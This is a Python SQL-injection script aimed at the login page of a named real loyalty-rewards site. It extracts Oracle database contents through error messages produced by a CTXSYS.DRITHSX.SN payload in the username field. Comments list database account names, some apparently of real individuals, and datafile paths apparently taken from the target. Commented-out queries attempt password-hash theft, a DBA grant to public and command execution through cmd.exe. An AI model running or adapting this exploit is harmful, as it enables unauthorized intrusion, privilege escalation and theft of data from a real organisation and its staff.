import json
import colorama
from http import HTTPStatus
from typing import Dict, Optional, List
from requests import Session
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
from bs4 import BeautifulSoup
from random import choices, randint
from string import ascii_letters
from re import compile, IGNORECASE, MULTILINE
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from pprint import pprint
from time import sleep

colorama.init(autoreset=True)
disable_warnings(InsecureRequestWarning)
print(colorama.Back.BLACK, end="")
BASE_DIR = Path(__file__).resolve().parent
ROSHAN_DIR = BASE_DIR / "roshan"
ROSHAN_DIR.mkdir(exist_ok=True, parents=True)
ERROR_DIR = ROSHAN_DIR / "errors"
ERROR_DIR.mkdir(exist_ok=True, parents=True)
OUT_DIR = ROSHAN_DIR / "out.json"
LOCK = Lock()

TARGET_URL = 'https://rewards.roshan.af/loyaltyreward/Login.aspx'
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
PROXY: Optional[str] = None
ORA_ERROR = compile(r'(ORA|DRG)-.*', IGNORECASE | MULTILINE)
session = Session()
session.verify = False
session.allow_redirects = False
if PROXY is not None:
    session.proxies.update({'https': PROXY, 'http': PROXY})
session.headers.update({'User-Agent': USER_AGENT})
form_data: Dict[str, str] = {}


def _update_session():
    response = session.get(TARGET_URL)
    html_body = BeautifulSoup(response.content, 'html.parser')
    for input_name in (
            '__VIEWSTATE', '__EVENTTARGET', '__EVENTARGUMENT', '__VIEWSTATEGENERATOR',
            '__EVENTVALIDATION'
    ):
        value = html_body.find('input', {'type': 'hidden', 'name': input_name}).attrs['value']
        form_data[input_name] = value
    form_data.update({
        'ctl00$ContentPlaceHolder1$lang': '1',
        'ctl00$ContentPlaceHolder1$btnVerify': ''
    })

# ['SYS', 'AUDSYS', 'SYSTEM', 'SYSBACKUP', 'SYSDG', 'SYSKM', 'SYSRAC', 'OUTLN', 'XS$NULL', 'GSMADMIN_INTERNAL', 'GSMUSER', 'GSMROOTUSER', 'DIP', 'REMOTE_SCHEDULER_AGENT', 'DBSFWUSER', 'ORACLE_OCM', 'SYS$UMF', 'DBSNMP', 'APPQOSSYS', 'GSMCATUSER', 'GGSYS', 'XDB', 'ANONYMOUS', 'WMSYS', 'MDDATA', 'OJVMSYS', 'CTXSYS', 'ORDSYS', 'ORDDATA', 'ORDPLUGINS', 'SI_INFORMTN_SCHEMA', 'MDSYS', 'OLAPSYS', 'DVSYS', 'LBACSYS', 'DVF', 'RSP', 'SHAFI', 'CLC', 'RBI', 'LOYALTY', 'CLC_LOY', 'ALI', 'AUD', 'DBOPER', 'CLCOPER', 'APP_SEL', 'MOHAMMAD.ISHAQ', 'MARKETING', 'OEMADMIN', 'SYEDABDULLAH', 'MUSLIMA.SAFARI', 'PARWEZ.MOHAMMADI', 'KHALILRAHMAN.SARWAR', 'ROSHANDEVELOPER', 'EAPPRAISAL', 'HRAT', 'PARI.SULTANI', 'KHTERA.AHMADI', 'MANIZHA.AZEDYAAR', 'RAP', 'DM', 'LEAP', 'YAQOOB.AYOUBI', 'DBLINK', 'WALIULLAH.RAHIMEE']
# ['/oracle/oradata/CVMDB/system01.dbf', '/data_04/cvmdb/RSP_TBS_02.DBF', '/oracle/oradata/CVMDB/sysaux01.dbf', '/data_03/cvmdb/LEAP_TBS_03.DBF', '/undo_a/cvmdb/UNDO_TBS_A_01.dbf', '/oracle/oradata/CVMDB/users01.dbf', '/undo_a/cvmdb/UNDO_TBS_A_02.dbf', '/data_02/cvmdb/CLC_TBS_24.DBF', '/undo_a/cvmdb/UNDO_TBS_A_03.dbf', '/undo_a/cvmdb/UNDO_TBS_A_04.dbf', '/data_03/cvmdb/LEAP_TBS_01.DBF', '/data_01/cvmdb/CLC_TBS_01.DBF', '/data_02/cvmdb/CLC_TBS_02.DBF', '/data_03/cvmdb/CLC_TBS_03.DBF', '/data_04/cvmdb/CLC_TBS_04.DBF', '/data_01/cvmdb/CLC_TBS_05.DBF', '/data_02/cvmdb/CLC_TBS_06.DBF', '/data_03/cvmdb/CLC_TBS_07.DBF', '/data_04/cvmdb/CLC_TBS_08.DBF', '/data_01/cvmdb/CLC_TBS_09.DBF', '/data_02/cvmdb/CLC_TBS_10.DBF', '/data_03/cvmdb/CLC_TBS_11.DBF', '/data_04/cvmdb/CLC_TBS_12.DBF', '/data_01/cvmdb/CLC_TBS_13.DBF', '/data_02/cvmdb/CLC_TBS_14.DBF', '/data_03/cvmdb/CLC_TBS_15.DBF', '/data_01/cvmdb/CLC_IDX_01.DBF', '/data_04/cvmdb/CLC_TBS_16.DBF', '/data_01/cvmdb/CLC_IDX_1_01.DBF', '/data_01/cvmdb/CLC_TBS_1_01.DBF', '/data_02/cvmdb/LOYALTY_TBS_01.DBF', '/data_02/cvmdb/LOY_IDX_01.DBF', '/data_02/cvmdb/LOY_TBS_01.DBF', '/data_02/cvmdb/SMS_TBS_01.DBF', '/data_01/cvmdb/CLC_TBS_17.DBF', '/audit/cvmdb/AUDIT_TBS_01.DBF', '/data_01/cvmdb/LOY_TBS_02.DBF', '/data_01/cvmdb/CLC_TBS_18.DBF', '/data_01/cvmdb/LOY_TBS_03.DBF', '/data_02/cvmdb/CLC_TBS_19.DBF', '/data_02/cvmdb/CLC_TBS_20.DBF', '/data_03/cvmdb/CLC_TBS_21.DBF', '/data_03/cvmdb/CLC_TBS_22.DBF', '/data_03/cvmdb/CLC_TBS_23.DBF', '/data_03/cvmdb/LOY_TBS_04.DBF', '/data_04/cvmdb/LOY_IDX_02.DBF', '/data_04/cvmdb/LOY_TBS_05.DBF', '/data_01/cvmdb/LOY_TBS_06.DBF', '/data_02/cvmdb/LOY_IDX_03.DBF', '/data_04/cvmdb/LOY_TBS_07.DBF', '/data_04/cvmdb/RSP_TBS_01.DBF', '/data_04/cvmdb/HRAT_TBS_01.DBF', '/data_04/cvmdb/MISC_TBS_01.DBF', '/data_01/cvmdb/LEAP_TBS_02.DBF', '/data_03/cvmdb/LEAP_TBS_04.DBF', '/data_01/cvmdb/CLC_TBS_25.DBF', '/data_02/cvmdb/SMS_TBS_02.DBF', '/data_04/CLC_TBS_26.DBF', '/data_01/cvmdb/CLC_TBS_26.DBF', '']
def _query_generator(index: int) -> str:

    query = f'SELECT count(*) FROM all_users'
    query = f'SELECT username FROM all_users ORDER BY id offset {index} ROWS FETCH NEXT 1 ROWS ONLY'

    # query = f'SELECT count(*) FROM V$DATAFILE'
    # query = f'SELECT name FROM V$DATAFILE ORDER BY id offset {index} ROWS FETCH NEXT 1 ROWS ONLY'

    # query = "SELECT count(*) FROM all_tables"
    # query = "SELECT dbms_xmlgen.getxmltype(SELECT table_name FROM all_tables) FROM dual"
    # query = f"SELECT table_name FROM all_tables ORDER BY id offset {index} ROWS FETCH NEXT 1 ROWS ONLY"
    # query = f"select OWNER||';'||db_link||';'||USERNAME||';'||HOST from all_db_links ORDER BY id offset {index} ROWS FETCH NEXT 1 ROWS ONLY"
    # query = "SELECT instance_name FROM v$instance@ED.ROSHAN.AF"
    # query = f"Select KIND||';'||TYPE_NAME||';'||NAME from user_java_policy ORDER BY id offset {index} ROWS FETCH NEXT 1 ROWS ONLY"

    # query = "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL"
    # query ="SELECT username FROM (SELECT ROWNUM r||,username||,password FROM all_users ORDER BY username) WHERE r=1"
    # query =f"select table_name||'-' From user_tables ORDER BY id offset {index} ROWS FETCH NEXT 1 ROWS ONLY"
    # query = "utl_inaddr.get_host_name((select user from dual))"
    # query = "select password from sys.user$ where rownum=1"
    # query = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT'.PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' grant dba to public'''';END;'';END;--','SYS',0,'1',0)"
    # query = "SELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('LOYALTY','LOYALTY','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant to public'''';END;'';END;--','SYS',0,'1',0) FROM DUAL"


    


    return f"-1' OR 1=CTXSYS.DRITHSX.SN(user,({query})) --"


def _send_request(index: int, out: Dict[int, str]):
    password = "".join(choices(ascii_letters, k=randint(5, 9)))
    send_form = dict(form_data)
    send_form.update({'ctl00$ContentPlaceHolder1$txtPassword': password})
    query = _query_generator(index)
    # sleep(randint(10, 15) / 10.0)
    with LOCK:
        print(colorama.Fore.MAGENTA + f'Sending {index}, {query}')
    query = _query_generator(index)
    send_form.update({'ctl00$ContentPlaceHolder1$txtUsername': query})
    sleep_index = 1
    while True:
        try:
            response = session.post(TARGET_URL, send_form, allow_redirects=False)
            break
        except RequestException as error:
            sleep_time = max(50, 2 ** sleep_index) + randint(1, 10)
            sleep_index += 1
            with LOCK:
                print(colorama.Fore.YELLOW + f"[{index:04d}]: {[sleep_time]} {error}")
            sleep(sleep_time)
    soup = BeautifulSoup(response.content, 'html.parser')
    # 302 True, 200 False
    is_found = False
    if response.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
        texts = soup.findAll(string=True)
        for line in texts:
            if is_found is True:
                break
            line_inner: str
            for line_inner in line.split('\n'):
                is_ora = ORA_ERROR.match(line_inner)
                if is_ora:
                    if line_inner.startswith('DRG-11701'):
                        parts = line_inner.split(" ")
                        result = " ".join(parts[2:-3])
                        out[index] = result
                        with LOCK:
                            print(colorama.Fore.GREEN + f"[{index:04d}]: {result}")
                        is_found = True
                        break
        error_file = ERROR_DIR / "error.html"
        with error_file.open('wb') as fp:
            fp.write(response.content)
    else:
        print(colorama.Fore.RED + "Bad Status ", response.status_code)


def _do_request():
    out: Dict[int, str] = dict()
    prev_len = len(out)
    with ThreadPoolExecutor(max_workers=5) as executor:
        for index in range(1):
            # with LOCK:
            #     if index > 0 and len(out) == prev_len:
            #         print("not more")
            #         break
            # _send_request(index, out)
            executor.submit(_send_request, index, out)
            # with LOCK:
            #     prev_len = len(out)

    with OUT_DIR.open("w") as fp:
        json.dump(out, fp)
    pprint(out)


if __name__ == '__main__':
    _update_session()
    _do_request()
